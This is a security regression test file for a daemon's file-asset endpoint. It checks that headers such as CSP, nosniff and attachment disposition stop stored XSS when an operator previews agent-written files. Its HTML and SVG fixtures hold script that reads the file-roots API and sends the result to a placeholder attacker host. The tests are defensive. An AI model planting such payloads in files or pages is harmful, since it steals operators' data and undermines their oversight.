// Security regression tests: Stored XSS via /api/files/asset (CWE-79)
//
// These tests verify that the /api/files/asset endpoint returns proper
// security headers for active content types (text/html, image/svg+xml)
// to prevent stored XSS when agent-authored files are previewed by the
// operator through the dashboard.

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Hono } from "hono";
import { mkdtempSync, rmSync, writeFileSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { filesRoutes, assetSecurityHeaders } from "../src/routes/files.js";

// ─── Unit tests for assetSecurityHeaders ──────────────────────────────

describe("assetSecurityHeaders", () => {
  it("returns X-Content-Type-Options: nosniff for all content types", () => {
    const cases = [
      "image/png",
      "text/plain; charset=utf-8",
      "application/json; charset=utf-8",
      "application/octet-stream",
    ];
    for (const ct of cases) {
      const headers = assetSecurityHeaders(ct, "/tmp/test.png");
      expect(headers["X-Content-Type-Options"]).toBe("nosniff");
    }
  });

  it("returns strict CSP + X-Frame-Options for text/html", () => {
    const headers = assetSecurityHeaders("text/html; charset=utf-8", "/tmp/mockup.html");
    expect(headers["Content-Security-Policy"]).toBeDefined();
    expect(headers["Content-Security-Policy"]).toContain("default-src 'none'");
    // script-src is NOT present — scripts are blocked by default-src 'none'
    expect(headers["Content-Security-Policy"]).not.toContain("script-src");
    // frame-ancestors prevents clickjacking
    expect(headers["Content-Security-Policy"]).toContain("frame-ancestors 'none'");
    expect(headers["X-Frame-Options"]).toBe("DENY");
  });

  it("returns Content-Disposition: attachment for SVG to prevent script execution", () => {
    const headers = assetSecurityHeaders("image/svg+xml", "/workspace/diagram.svg");
    expect(headers["Content-Disposition"]).toBe("attachment; filename*=UTF-8''diagram.svg");
  });

  it("encodes unicode SVG filenames with RFC 5987 so CJK/emoji names work", () => {
    const headers = assetSecurityHeaders("image/svg+xml", "/workspace/图表.svg");
    expect(headers["Content-Disposition"]).toContain("attachment");
    expect(headers["Content-Disposition"]).toContain("filename*=UTF-8''");
    // Verify the unicode is percent-encoded, not raw
    expect(headers["Content-Disposition"]).not.toContain("图表");
    expect(headers["Content-Disposition"]).toContain(encodeURIComponent("图表.svg"));
  });

  it("does NOT return Content-Disposition for non-SVG images", () => {
    const headers = assetSecurityHeaders("image/png", "/workspace/photo.png");
    expect(headers["Content-Disposition"]).toBeUndefined();
  });

  it("does NOT return CSP for non-HTML text types", () => {
    const headers = assetSecurityHeaders("text/plain; charset=utf-8", "/workspace/readme.md");
    expect(headers["Content-Security-Policy"]).toBeUndefined();
    expect(headers["X-Frame-Options"]).toBeUndefined();
  });
});

// ─── Integration tests against the asset route ────────────────────────

describe("GET /api/files/asset — security headers", () => {
  let root: string;
  let app: Hono;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "openrig-xss-test-"));

    // Create test files that would be attack vectors without the fix
    writeFileSync(
      join(root, "xss-payload.html"),
      `<!DOCTYPE html>
<html>
<body>
<h1>XSS Test</h1>
<script>
// This script would execute in the daemon's origin without CSP
fetch('/api/files/roots').then(r => r.json()).then(data => {
  new Image().src = 'https://attacker.example/steal?' + JSON.stringify(data);
});
</script>
</body>
</html>`,
    );

    writeFileSync(
      join(root, "xss-payload.svg"),
      `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/javascript">
    fetch('/api/files/roots').then(r => r.json()).then(data => {
      new Image().src = 'https://attacker.example/steal?' + JSON.stringify(data);
    });
  </script>
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>`,
    );

    writeFileSync(join(root, "safe-image.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47]));

    // Wire the route exactly like the existing tests do (files-asset-range.test.ts)
    const allowlist = [{ name: "ws", canonicalPath: realpathSync(root) }];
    app = new Hono();
    app.use("*", async (c, next) => {
      c.set("filesAllowlist" as never, allowlist);
      c.set("fileWriteService" as never, null);
      await next();
    });
    app.route("/api/files", filesRoutes());
  });

  afterEach(() => rmSync(root, { recursive: true, force: true }));

  const url = (p: string, extra = "") => `/api/files/asset?root=ws&path=${encodeURIComponent(p)}${extra}`;

  it("serves HTML with render=1 and includes strict CSP that blocks scripts", async () => {
    const res = await app.request(url("xss-payload.html", "&render=1"));
    expect(res.status).toBe(200);
    expect(res.headers.get("Content-Type")).toBe("text/html; charset=utf-8");

    // CSP MUST be present and MUST block scripts
    const csp = res.headers.get("Content-Security-Policy");
    expect(csp).toBeDefined();
    expect(csp).toContain("default-src 'none'");
    // Verify no script-src directive (scripts blocked by default-src 'none')
    expect(csp).not.toContain("script-src");

    // nosniff must be present
    expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");

    // X-Frame-Options prevents embedding in iframes
    expect(res.headers.get("X-Frame-Options")).toBe("DENY");
  });

  it("serves SVG with Content-Disposition: attachment to prevent script execution", async () => {
    const res = await app.request(url("xss-payload.svg"));
    expect(res.status).toBe(200);
    expect(res.headers.get("Content-Type")).toBe("image/svg+xml");

    // Content-Disposition: attachment forces download instead of rendering
    const disposition = res.headers.get("Content-Disposition");
    expect(disposition).toBeDefined();
    expect(disposition).toContain("attachment");
    expect(disposition).toContain("filename*=UTF-8''");

    // nosniff must be present
    expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");
  });

  it("includes nosniff on safe content types too", async () => {
    const res = await app.request(url("safe-image.png"));
    expect(res.status).toBe(200);
    expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");
    // No CSP needed for images
    expect(res.headers.get("Content-Security-Policy")).toBeNull();
  });

  it("includes security headers on Range (206) responses too", async () => {
    const res = await app.request(
      url("xss-payload.html", "&render=1"),
      { headers: { Range: "bytes=0-50" } },
    );
    expect(res.status).toBe(206);

    // CSP must be present even on partial content
    const csp = res.headers.get("Content-Security-Policy");
    expect(csp).toBeDefined();
    expect(csp).toContain("default-src 'none'");
    expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");
  });

  it("does NOT serve HTML as text/html without render=1 opt-in", async () => {
    const res = await app.request(url("xss-payload.html"));
    expect(res.status).toBe(200);
    // Without render=1, HTML is served as text/plain (safe)
    expect(res.headers.get("Content-Type")).toBe("text/plain; charset=utf-8");
  });
});
